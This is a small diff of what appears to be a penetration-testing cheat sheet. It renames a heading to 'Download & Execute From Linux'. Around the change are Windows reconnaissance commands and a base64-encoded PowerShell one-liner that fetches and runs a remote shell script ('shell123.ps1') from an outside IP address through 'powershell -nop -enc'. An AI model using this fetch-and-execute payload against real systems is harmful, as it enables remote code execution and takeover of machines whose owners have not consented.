@@ -42,7 +42,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 Get-Content C:\WINDOWS\System32\drivers\etc\hosts
 ```
-### Download & Execute
+### Download & Execute From Linux
 ```
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.99.110/shell123.ps1')" | iconv -t UTF-16LE | base64 -w 0
 powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
